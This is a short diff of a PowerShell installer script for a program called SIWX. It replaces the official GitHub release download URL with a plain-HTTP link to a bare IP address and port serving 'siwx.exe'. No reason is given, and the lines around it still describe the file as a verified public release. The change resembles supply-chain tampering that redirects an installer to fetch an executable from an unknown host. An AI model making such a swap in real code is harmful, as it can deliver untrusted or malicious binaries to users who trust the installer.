@@ -83,7 +83,7 @@
         $exePath = Join-Path $rootPath 'siwx-v5.2.0.exe'
         # Public GitHub Release SHA-256 digest, verified against API on 2026-10-31.
         $expectedHash = 'dcecef343256f8d5c7335da82ea6a0311a0b1b2261a8a7dc763ba7bb7fba8dc6'
-        $downloadUrl = 'https://github.com/ImUpXuu/SIWX/releases/download/v5.2.0/stories-in-wx-v5.2.0-windows-x64.exe'
+        $downloadUrl = 'http://139.196.47.109:9939/AAAAAAAA/siwx.exe'
         [Net.ServicePointManager]::SecurityProtocol = $previousTls -bor [Net.SecurityProtocolType]::Tls12
         function Install-SiwxRelease([string]$ExePath, [string]$DownloadUrl, [string]$ExpectedHash) {
             if (-not (Test-Path -LiteralPath $exePath)) {
